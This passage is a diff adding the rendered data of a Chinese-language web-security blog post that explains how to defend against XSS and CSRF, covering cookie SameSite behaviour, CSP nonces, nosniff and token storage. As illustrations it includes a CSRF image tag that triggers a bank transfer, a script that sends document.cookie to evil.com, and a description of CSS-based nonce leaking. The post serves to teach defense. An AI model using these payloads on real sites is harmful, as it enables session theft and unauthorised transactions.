@@ -1,0 +1,1130 @@
+1:"$Sreact.fragment"
+2:I[48245,["7177","static/chunks/app/layout-a4020a707966f3ad.js"],"ThemeProvider"]
+3:I[92233,["7177","static/chunks/app/layout-a4020a707966f3ad.js"],"default"]
+4:I[48350,[],""]
+5:I[11412,[],""]
+6:I[43714,["4345","static/chunks/app/not-found-d958f5a82c6bd60e.js"],"default"]
+7:I[74646,["6711","static/chunks/6711-28504c068f3cc299.js","8512","static/chunks/app/v2/layout-6e2326ce7d294bfd.js"],"default"]
+9:I[96727,[],"OutletBoundary"]
+b:I[14038,[],"AsyncMetadataOutlet"]
+d:I[96727,[],"ViewportBoundary"]
+f:I[96727,[],"MetadataBoundary"]
+10:"$Sreact.suspense"
+12:I[92950,[],""]
+:HL["/_next/static/media/8760c4774489e4ba-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/css/01cc54cdad670ab3.css","style"]
+:HL["/_next/static/css/d3281eaf3cab9132.css","style"]
+:HL["/_next/static/css/f18ff65194ef1f2e.css","style"]
+:HL["/_next/static/css/2aa38e97f45426ef.css","style"]
+0:{"P":null,"b":"nTKE4IB87lEgZWUaCupOc","p":"","c":["","v2","xss-and-csrf-defense-stack.zh"],"i":false,"f":[[["",{"children":["v2",{"children":[["slug","xss-and-csrf-defense-stack.zh","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/01cc54cdad670ab3.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/d3281eaf3cab9132.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":[["$","link",null,{"rel":"alternate","type":"application/rss+xml","title":"jialin's RSS Feed","href":"https://jialin00.com/rss.xml"}],["$","link",null,{"rel":"icon","type":"image/svg+xml","href":"/fav.svg"}],["$","link",null,{"rel":"apple-touch-icon","sizes":"180x180","href":"/apple-touch-icon-180x180.png"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"(function(){var l=document.createElement('link');l.rel='stylesheet';l.href=\"https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Noto+Serif+TC:wght@400;600;700&family=STIX+Two+Text:ital,wght@0,400;0,700;1,400&family=Share+Tech+Mono&family=VT323&display=swap\";document.head.appendChild(l)})()"}}],["$","noscript",null,{"children":["$","link",null,{"rel":"stylesheet","href":"https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Noto+Serif+TC:wght@400;600;700&family=STIX+Two+Text:ital,wght@0,400;0,700;1,400&family=Share+Tech+Mono&family=VT323&display=swap"}]}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org/\",\"@type\":\"WebSite\",\"name\":\"jialin00.com\",\"author\":{\"@type\":\"Person\",\"name\":\"JiaLin Huang\"},\"datePublished\":\"2022-05-17\",\"description\":\"Exploring web technologies, cloud computing, and AWS, while integrating philosophical perspectives. We examine technological advancements and their impact on human understanding, emphasizing the essential role of philosophy in tech-driven life.\",\"keywords\":\"cloud, cicd, Nextjs, philosophy, simplification\"}"}}]]}],["$","body",null,{"children":["$","$L2",null,{"children":[["$","$L3",null,{}],["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L6",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]]}]}]]}]]}],{"children":["v2",["$","$1","c",{"children":[null,[["$","$L7",null,{}],["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":[["slug","xss-and-csrf-defense-stack.zh","d"],["$","$1","c",{"children":[null,["$","$L4",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L8",[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/f18ff65194ef1f2e.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/2aa38e97f45426ef.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","$L9",null,{"children":["$La",["$","$Lb",null,{"promise":"$@c"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$Ld",null,{"children":"$Le"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lf",null,{"children":["$","div",null,{"hidden":true,"children":["$","$10",null,{"fallback":null,"children":"$L11"}]}]}]]}],false]],"m":"$undefined","G":["$12",[]],"s":false,"S":true}
+e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"}]]
+a:null
+c:{"metadata":[["$","title","0",{"children":"XSS 跟 CSRF 各要怎麼防，為什麼先處理 XSS  | jialinhuang"}],["$","meta","1",{"name":"description","content":"CSRF 在頁面外面騙瀏覽器送出 request，XSS 直接在頁面裡執行；XSS 一旦進來，CSRF 的防線就全部失效。哪一道防線能攔下哪一種攻擊、瀏覽器現在怎麼處理 SameSite、nonce 跟 nosniff，以及 cookie session 跟 JWT 兩種 app 要怎麼一步步補強。"}],["$","link","2",{"rel":"canonical","href":"/v2/xss-and-csrf-defense-stack"}]],"error":null,"digest":"$undefined"}
+11:"$c:metadata"
+13:I[86734,["7654","static/chunks/7654-2fe46cddc56d2856.js","9489","static/chunks/app/v2/%5Bslug%5D/page-2e406f5eec6a5c88.js"],"MdDoc"]
+14:Tb8f3,<p>你登入了 <code>bank.com</code>，接著在另一個分頁打開 <code>evil.com</code>。那一頁裡有這一行：</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">img</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> src</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"https://bank.com/transfer?to=evil&#x26;amount=1000"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>瀏覽器會對 <code>bank.com</code> 發出一個 request。過去好幾年，不管是哪一頁發起的，只要 request 是送往 <code>bank.com</code>，瀏覽器就會把 <code>bank.com</code> 的 session cookie 一起帶上。session cookie 是登入時 <code>bank.com</code> 存在瀏覽器裡的一小段值，server 讀到它，就知道這個 request 是你送的。於是這筆轉帳成立了。</p>
+<p>這就是 CSRF（Cross-Site Request Forgery，跨站請求偽造）。你什麼都沒點，攻擊者只是騙瀏覽器送出一個 request，就借用了你已經登入的 session。</p>
+<p>那這個 <code>&#x3C;img></code> 現在還有用嗎？大多沒有了。在本機用 HTTPS server 扮演 <code>bank.test</code> 跟 <code>evil.test</code> 測試的話，Chrome for Testing 156 只送出標了 <code>SameSite=None</code> 的 cookie，因為從 Chrome 80（2020 年陸續上線）開始，沒寫 <code>SameSite</code> 的 cookie 會被當成 <code>SameSite=Lax</code>，別的網站的圖片發出的 request 就不會帶它。Firefox 159 一個 cookie 都沒送，因為它的 Total Cookie Protection（2022 年 6 月起預設開啟）會在 <code>evil.test</code> 裡另外給 <code>bank.test</code> 一個空的 cookie jar。Safari 則是從 13.1（2020 年 3 月，WebKit 的公告）起，預設就不在這種跨站 request 上帶 cookie。</p>
+<p>不過，要是把 <code>&#x3C;img></code> 換成一個會自己送出 POST 到 <code>bank.test/transfer</code> 的 form，有兩種情況 cookie 又會被帶上。Firefox 會送出沒寫 <code>SameSite</code> 的 cookie，因為 Firefox 沒有把預設值改成 <code>Lax</code>。Chrome 也會送，但只限 cookie 設下之後的兩分鐘內，這是 Chrome 稱為「Lax + POST」的暫時例外（<a href="https://www.chromium.org/updates/same-site/">Chromium 的 SameSite 更新紀錄</a>）。登入 130 秒後再送一次，Chrome 就沒帶了。標了 <code>SameSite=Lax</code> 或 <code>Strict</code> 的 cookie，上面這幾種情況都沒被送出。所以 CSRF 能用的路比以前少，但沒寫 <code>SameSite</code> 的 cookie 還是有風險。</p>
+<hr>
+<p>再看另一個情境。你逛到 <code>forum.com</code>，讀到某人的留言，留言內容是：</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'https://evil.com/steal?c='</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> +</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> document.cookie)&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>如果 <code>forum.com</code> 把留言原封不動當成 HTML 放進頁面，沒做 escape（把 <code>&#x3C;</code> 換成 <code>&#x26;lt;</code>，讓它顯示成文字），這段 script 就會在 <code>forum.com</code> 的 origin 裡執行。origin 是 scheme、host 跟 port 三者合起來，這裡就是 <code>https://forum.com</code>。瀏覽器把每個 origin 的資料分開放，而在某個 origin 裡跑的程式，那個 origin 擁有的東西它都碰得到。所以這段 script 能讀到頁面的 DOM、cookie（標了 <code>HttpOnly</code> 的除外）跟 localStorage，攻擊者就拿到了你的 session。</p>
+<p>這就是 XSS（Cross-Site Scripting，跨站腳本攻擊）。攻擊者塞進來的程式，執行起來就像是 <code>forum.com</code> 自己寫的。</p>
+<hr>
+<p>把你登入的網站想成一棟大樓吧。server 是大樓的管理員，你在裡面有一戶。瀏覽器是幫你跑腿的人，身上帶著你那一戶的鑰匙，也就是 session cookie。每張單子就是一個 request。跑腿的人把單子送進大樓時會亮出鑰匙，管理員看到鑰匙，就照單子上寫的辦。</p>
+<p>兩個攻擊者站的位置不一樣。CSRF 的攻擊者在<strong>外面</strong>。他沒有鑰匙，只能從別的網站的頁面遞一張假單子給跑腿的人，而跑腿的人照樣亮出你的鑰匙，管理員也就照辦了。XSS 的攻擊者則是把單子混進<strong>你自己的頁面裡</strong>。網站把別人寫的留言直接當成 HTML 放進你的頁面，就等於在你的單子本上留了一個欄位給陌生人填。從那個欄位寫出去的單子，跑腿的人跟管理員都分不出是不是你寫的，而且填那個欄位的人，還看得見你單子本上的每一頁。</p>
+<hr>
+<h2>兩種攻擊，兩種威脅模型</h2>
+<p><strong>XSS</strong>：<mark>不是我寫的程式碼，在我的 origin 裡執行。</mark>攻擊者把 payload 放進會被存起來的內容（留言、個人資料欄位）、會被反射回頁面的 URL 參數，或是透過 DOM 操作塞進來。一旦執行，它就有這個 origin 的全部權限，能讀沒標 HttpOnly 的 cookie、localStorage 跟頁面狀態，也能用使用者的身分送 request。它利用了頁面對使用者內容的信任。</p>
+<p><strong>CSRF</strong>：<mark>我的瀏覽器送出了一個我沒打算送的 request。</mark>攻擊者掌握另一個 origin，在頁面上嵌入某個東西（圖片、form、fetch），觸發一個送往目標網站的 request。只要 cookie 的設定允許，瀏覽器就會自動帶上目標網站的 cookie，而 server 光看 cookie，分不出這個 request 是不是你本來就想送的。它利用了瀏覽器會自動帶 cookie 這件事。</p>
+<hr>
+<h2>登入方式決定了你要面對哪一種威脅</h2>
+<p>app 怎麼驗證使用者，決定了哪一種威脅比較嚴重。</p>
+<p><strong>Cookie session</strong>（server 設一個 session cookie，之後瀏覽器送 request 到這個 server，都自動帶上它）：</p>
+<ul>
+<li>會被 CSRF 攻擊。別的網站發起的 request 可能會帶著你的 cookie，除非 <code>SameSite</code>（後面會講）把它攔下來。</li>
+<li>XSS 一樣危險。它能讀沒標 HttpOnly 的 cookie，也能用完整的 session 送 same-origin request。</li>
+</ul>
+<p><strong>Token 驗證</strong>（JWT，也就是 JSON Web Token，或類似的字串，由你自己的 JavaScript 放進每個 request 的 <code>Authorization</code> header）：</p>
+<ul>
+<li>CSRF 大致上就不成問題了。沒有 cookie 會被自動帶上，偽造的 request 不會帶著憑證。</li>
+<li>XSS 變成最主要的威脅。要是 token 放在 <code>localStorage</code>，XSS 的 payload 讀出來之後，就能在任何裝置上冒充這個使用者，直到 token 過期。</li>
+</ul>
+<p>現代的 SPA 常用 token，server 產生頁面的 app 通常用 cookie。</p>
+<hr>
+<h2>XSS 的防線，一層一層看</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>層</th><th>誰負責</th><th>做什麼</th></tr></thead><tbody><tr><td>Output encoding</td><td>Client</td><td>用框架的插值語法（<code>{value}</code>），別再動不動就用 <code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>v-html</code>。</td></tr><tr><td>Sanitization</td><td>Client</td><td>非得顯示使用者寫的 HTML 時，先交給 DOMPurify，它會把 script 跟 event handler 拿掉。不要自己寫。</td></tr><tr><td>Content Security Policy</td><td>Server</td><td><code>script-src 'self' 'nonce-RANDOM'</code>。一個 response header，列出哪些 script 可以執行。不符合的，瀏覽器一律拒絕。</td></tr><tr><td>HttpOnly cookie</td><td>Server</td><td><code>Set-Cookie: ...; HttpOnly</code>。JS 讀不到它，可是 XSS 送出的 request 還是會帶上它，見下面〈HttpOnly 只能減少損害，不能防止 XSS〉。</td></tr><tr><td>存進資料庫的內容先清過</td><td>Server</td><td>寫入時清一次，輸出時也清一次，以免有些內容在寫入檢查加上之前就已經存進去了。</td></tr><tr><td><code>X-Content-Type-Options</code></td><td>Server</td><td><code>nosniff</code>。瀏覽器不再從檔案的位元組去猜它是什麼，所以沒標類型的檔案不會被猜成網頁，沒標成 JavaScript 的檔案也不能當 script 載入。</td></tr><tr><td>Trusted Types</td><td>Client + Server</td><td>一個 CSP 指令（<code>require-trusted-types-for 'script'</code>）。一般字串直接 assign 給 <code>innerHTML</code> 這類 sink 會丟出錯誤。policy 是你註冊的一個函式，例如 <code>trustedTypes.createPolicy('app', { createHTML: s => DOMPurify.sanitize(s) })</code>，呼叫 <code>policy.createHTML(str)</code> 時，瀏覽器把函式回傳的字串包成一個 <code>TrustedHTML</code> 物件，sink 只收這種物件。要是 policy 寫成 <code>s => s</code>，任何字串都能原樣進去。</td></tr></tbody></table>
+<p>sink 指的是會把字串變成 markup 或程式碼的 API，例如 <code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code>、<code>eval</code>。表格前兩列就處理掉大部分的問題，其餘幾層是額外的保險。</p>
+<p>Trusted Types 是在那一行程式真的執行時才抓到錯，不是在 build 的時候。Chrome for Testing 156 丟出 <code>TypeError: ... This document requires 'TrustedHTML' assignment</code>，Firefox 159 丟出 <code>Sink type mismatch violation blocked by CSP</code>。所以要有測試跑到那一行，才會看到這個錯誤。支援的版本是 Chrome 83、Firefox 148、Safari 26。</p>
+<p>CSP 的 nonce 是只用一次的隨機值。設了 <code>script-src 'self' 'nonce-abc123'</code> 之後，server 會在每個正當的 <code>&#x3C;script></code> tag 上加 <code>nonce="abc123"</code>，瀏覽器只執行帶著這個值的 inline script，另外加上從自己 origin 載入的 script 檔，這是 <code>'self'</code> 允許的。攻擊者塞進來的 script 沒有這個值，而且 server 每次回應都換一個新的 nonce，所以在舊頁面上看到的值，到了下一頁就沒用了。</p>
+<details>
+<summary>深入：XSS 為什麼偽造不了 nonce</summary>
+<p>攻擊者如果只能塞 markup 進來，例如一則留言，他得在頁面送出之前就把 nonce 寫進自己的 <code>&#x3C;script></code>。可是 nonce 是 server 每次回應時才產生的，他沒辦法事先知道。</p>
+<p>那從頁面上讀出來呢？CSP 用 response header 送的話，瀏覽器會把每個 <code>nonce</code> attribute 清成空字串，只有已經在執行的 script 能從 <code>.nonce</code> 這個 property 讀到原本的值：</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getAttribute</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'nonce'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">)  </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// ""</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).nonce  </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// "abc123"</span></span></code></pre></figure>
+<p>清掉 attribute，是為了不讓塞進來的 CSS 讀到 nonce。攻擊者的 CSS 可以替每個可能的字元各寫一條規則，<code>script[nonce^="a"]</code>、<code>script[nonce^="b"]</code>……，每條載入一張網址不同的背景圖。nonce 如果是 <code>a</code> 開頭，<code>script[nonce^="a"]</code> 就會生效，攻擊者的 server 就會收到 <code>a</code> 對應的背景圖 request。只要頁面沒有重新載入，nonce 就不會變。塞進來的 CSS 會用 <code>@import</code> 再向攻擊者的 server 要下一份 CSS，server 先不回，等收到圖的 request、知道第一個字元之後，才回一份猜第二個字元的規則，例如 <code>script[nonce^="ab"]</code>。這樣一直往下猜，就能拼出整個 nonce。attribute 清成空字串之後，這些規則都不會生效。Chrome for Testing 156 跟 Firefox 159 都會清掉。不過如果 CSP 是用 <code>&#x3C;meta></code> 送的，attribute 會留著，這招就還有機會。</p>
+<p>如果 nonce 寫死或亂數太短，攻擊者就可能猜中。</p>
+<p>沒有 <code>'unsafe-eval'</code> 的話，CSP 會封鎖 <code>eval</code>。加了它之後，如果頁面原本就有一段 script 會把網址參數丟進 <code>eval</code>，攻擊者只要在網址參數裡放自己的程式碼，再騙使用者打開這個網址，他的程式碼就會被執行。</p>
+<p>另外，用了 <code>'strict-dynamic'</code> 的話，有 nonce 的 script 去載入別的 script 時，被載入的 script 不用 nonce 也能執行。所以如果其中有一支 loader 會照網址參數去載入 script，攻擊者就能透過它載入自己的程式。<code>'unsafe-inline'</code> 跟 nonce 寫在一起倒是沒關係，因為有 nonce 的時候，瀏覽器會忽略 <code>'unsafe-inline'</code>。</p>
+</details>
+<details>
+<summary>深入：nosniff 是在回傳檔案時決定的，不是上傳時</summary>
+<p><code>X-Content-Type-Options</code> 跟它要保護的 <code>Content-Type</code>，都是 server 把存起來的檔案回傳時才設的，跟上傳那一次無關。這是兩趟不同的傳輸：</p>
+<ul>
+<li><strong>上傳</strong>（使用者把檔案傳給你）。這個 request 上的 <code>Content-Type</code> 是上傳的人自己填的，所以攻擊者可以任意設定。不要把它存起來之後拿來用。</li>
+<li><strong>回傳</strong>（server 把檔案傳給來看的人）。這時 <code>Content-Type</code> 由你的 server 自己設，通常依副檔名決定（<code>.png</code> 對應 <code>image/png</code>），再加上 <code>nosniff</code>。瀏覽器怎麼處理這個檔案，看的是這個 response。</li>
+</ul>
+<p><code>nosniff</code> 叫看檔案那個人的瀏覽器相信回傳時的 <code>Content-Type</code>，不要再從位元組去猜。所以前提是這個 <code>Content-Type</code> 本身是對的。如果你照抄上傳者填的值，回傳成 <code>text/html</code>，<code>nosniff</code> 也會照單全收，把它當網頁顯示出來。這個 header 只負責讓瀏覽器照你的標籤走，標籤要先標對。</p>
+<p>那瀏覽器到底在什麼時候會猜？在 Chrome for Testing 156 跟 Firefox 159 上測試：準備一個存起來的檔案，內容是一個帶 <code>&#x3C;script></code> 的 HTML 頁面，用不同的標籤回傳，直接在分頁裡打開。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>送出的 <code>Content-Type</code></th><th>沒有 <code>nosniff</code></th><th>有 <code>nosniff</code></th></tr></thead><tbody><tr><td>沒送</td><td>script 執行了（瀏覽器猜成 HTML）</td><td>沒執行</td></tr><tr><td><code>text/plain</code></td><td>沒執行</td><td>沒執行</td></tr><tr><td><code>image/png</code></td><td>沒執行</td><td>沒執行</td></tr><tr><td><code>text/html</code></td><td>執行了</td><td>執行了</td></tr></tbody></table>
+<p>只要正確標成 <code>image/png</code> 就夠了，兩個瀏覽器都沒有把標成圖片的檔案當成網頁。標籤沒送的時候，<code>nosniff</code> 才有作用。它在另一種執行方式上更重要，就是 <code>&#x3C;script src="/uploads/x.txt"></code> 這種 tag。<code>script-src 'self'</code> 允許自己 origin 的任何檔案，上傳的檔案也算在內。拿一個內容是 JavaScript 的檔案，用這種方式載入：</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>送出的 <code>Content-Type</code></th><th>沒有 <code>nosniff</code></th><th>有 <code>nosniff</code></th></tr></thead><tbody><tr><td>沒送、<code>text/plain</code>、<code>text/html</code>、<code>application/octet-stream</code></td><td>當成 script 執行了</td><td>被封鎖</td></tr><tr><td><code>image/png</code></td><td>被封鎖</td><td>被封鎖</td></tr></tbody></table>
+<p>加了 <code>nosniff</code> 之後，測過的每一種非 JavaScript 標籤，兩個瀏覽器都拒絕當成 script 執行。所以只要上傳的檔案照它真正的類型回傳，就沒辦法冒充你的 script。</p>
+<p>受害的是第三個人：攻擊者上傳一個藏了 script 的檔案，你的 server 把它存起來，另一個使用者打開它的網址。同一個檔案要是透過 <code>&#x3C;img></code> 載入，瀏覽器只會把它當圖片的位元組解碼，不會執行。</p>
+</details>
+<h3>HttpOnly 只能減少損害，不能防止 XSS</h3>
+<p><strong><code>HttpOnly</code> 讓 XSS 讀不到 cookie 的值，但沒辦法讓 XSS 不去使用這個 session。</strong> XSS 還是可以在 origin 裡面執行 <code>fetch('/transfer', ...)</code>，瀏覽器照樣自動帶上 HttpOnly cookie，server 也照常通過驗證。在 Chrome for Testing 156 跟 Firefox 159 上，<code>document.cookie</code> 列出了 <code>HttpOnly</code> cookie 以外的所有 cookie，而 same-origin 的 <code>fetch</code> POST 還是帶著它。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>能做到的事</th><th>沒有 <code>HttpOnly</code></th><th>有 <code>HttpOnly</code></th></tr></thead><tbody><tr><td>XSS 讀 <code>document.cookie</code></td><td>✅</td><td>❌</td></tr><tr><td>XSS 把 cookie 傳到攻擊者的 server</td><td>✅</td><td>❌</td></tr><tr><td>XSS 在受害者的瀏覽器裡送出已驗證的 request</td><td>✅</td><td>✅</td></tr><tr><td>受害者關掉分頁之後，攻擊還能繼續</td><td>✅</td><td>❌</td></tr><tr><td>從另一台裝置重放這個 cookie</td><td>✅</td><td>❌</td></tr></tbody></table>
+<p>第二列跟第三列看起來都是 XSS 發出一個 request，結果卻不一樣，因為瀏覽器只會把 cookie 帶給設它的那個網站。XSS 對 <code>evil.com</code> 發 request 的話，瀏覽器帶的是 <code>evil.com</code> 的 cookie，不會帶 <code>bank.com</code> 的。所以 script 要把 session 交給攻擊者，得先從 <code>document.cookie</code> 讀出它的值，再放進網址或 body 裡送出去。設了 <code>HttpOnly</code>，<code>document.cookie</code> 裡就沒有它，script 讀不到值，也就送不出去。XSS 對 <code>bank.com</code> 發的 request 倒是會帶上 cookie，只是 cookie 的值一直留在瀏覽器裡，攻擊者拿不到，只能趁分頁開著的時候借用。</p>
+<p>還是要設 <code>HttpOnly</code>。沒設的話，攻擊者能把 cookie 帶走，在自己的電腦上一直用到 server 結束這個 session 為止；設了之後，他只能透過受害者開著的那個分頁操作，分頁關了就沒了。但不要把它當成 XSS 的防線，防 XSS 要靠 output encoding 加上 CSP。</p>
+<details>
+<summary>深入：放在記憶體裡的 token，XSS 一樣讀得到</summary>
+<p>把 JWT 或 access token 放在記憶體裡（Zustand、React context、普通的 module 變數），<strong>比放 <code>localStorage</code> 好，但 XSS 還是讀得到</strong>。XSS 在你的 origin 裡執行，JS 碰得到的狀態，它都碰得到：</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// XSS payload，知道 store 在哪裡</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">useAuthStore.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getState</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">().token</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// 或是從某個 DOM 節點沿著 React fiber tree 找到元件的 state</span></span></code></pre></figure>
+<p>它比 <code>localStorage</code> 好的地方有兩個，都是在減少損害：</p>
+<ul>
+<li><strong>通用的 XSS payload 比較難得手。</strong> <code>localStorage.getItem('token')</code> 在每個網站上寫法都一樣。要讀 Zustand store，得先拿到那個 app 的 store，而每個 app 都不一樣。所以一支同時瞄準很多網站的 payload，很容易拿到 <code>localStorage</code> 裡的 token，要拿記憶體裡的就得針對個別 app 下工夫。</li>
+<li><strong>分頁一關，token 就跟著消失。</strong> payload 必須在 token 還在記憶體裡的時候執行。<code>localStorage</code> 的 token 存在磁碟上，重新整理、重開瀏覽器都還在，所以之後才執行的 XSS，就算隔了好幾天，還是找得到它。</li>
+</ul>
+<p>不過這比 <code>HttpOnly</code> 弱。<code>HttpOnly</code> cookie 完全讀不到；記憶體裡的 token 一旦被 payload 讀到，就能傳到攻擊者的 server，在任何裝置上重放，直到過期。這時只剩 token 的有效期限能限制損害，所以才會用短效的 access token（5 到 15 分鐘），再把長效的 refresh token 放在 HttpOnly cookie 裡，這樣偷到的 access token 只能用幾分鐘。不過只要 payload 還在執行，它就能自己呼叫 <code>/auth/refresh</code>。瀏覽器會自動帶上 refresh cookie，所以 payload 每呼叫一次，就拿到一個新的 access token 可以傳出去。要等 payload 停下來，最後傳出去的那個 token 才會在幾分鐘內失效。受害者關掉分頁之後，攻擊者就換不到新的 access token 了。因為 refresh token 在 HttpOnly cookie 裡，他讀不到，只能透過受害者開著的分頁去呼叫 <code>/auth/refresh</code>。反過來，如果 refresh token 放在 JS 讀得到的地方，被偷走之後，攻擊者可以一直自己換新的 access token，直到 refresh token 過期，受害者關不關分頁都一樣。</p>
+</details>
+<hr>
+<h2>CSRF 的防線，一層一層看</h2>
+<p><strong>讀這整張表時，先假設 XSS 已經防住了。</strong> 這裡幾乎每一道 CSRF 防線，在攻擊者能做 XSS 之後都會失效，因為 XSS 是以你自己的 origin 身分執行，能直接讀 token、DOM 跟頁面狀態。最後一欄「XSS 進來之後還有用嗎？」就是把這層依賴寫出來。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>層</th><th>誰負責</th><th>做什麼</th><th>XSS 進來之後還有用嗎？</th></tr></thead><tbody><tr><td><code>SameSite</code> cookie</td><td>Browser + Server</td><td><code>Set-Cookie: ...; SameSite=Lax</code>。單子如果是從別的網站遞來的，跑腿的人就不亮鑰匙。例外是你在別的網站點了連結，整個分頁換成你的網站，而且用的是 GET。跨站的 sub-resource request 跟跨站的 form POST 都不會帶 cookie。Chrome 從 Chrome 80（2020 年）起把沒寫 <code>SameSite</code> 的 cookie 當成 <code>Lax</code>，Firefox 跟 Safari 沒有，所以要明確寫出來。</td><td>沒用。XSS 在同一個 site 裡執行，cookie 照常帶上。</td></tr><tr><td><code>SameSite=Strict</code></td><td>Server</td><td><code>Set-Cookie: ...; SameSite=Strict</code>。就連從別的網站點連結進來，第一個 request 也不帶 cookie。用在管理後台、跟錢有關的 endpoint。</td><td>沒用，理由同上。</td></tr><tr><td>CSRF token</td><td>Client + Server</td><td>只印在你自己單子本上的暗號。server 在 form 或 response 裡放一個隨機 token，會改變狀態的 request 都要把它送回來。<code>evil.com</code> 讀不到你的頁面，因為同源政策（same-origin policy，SOP）不讓一個 origin 讀另一個 origin 的 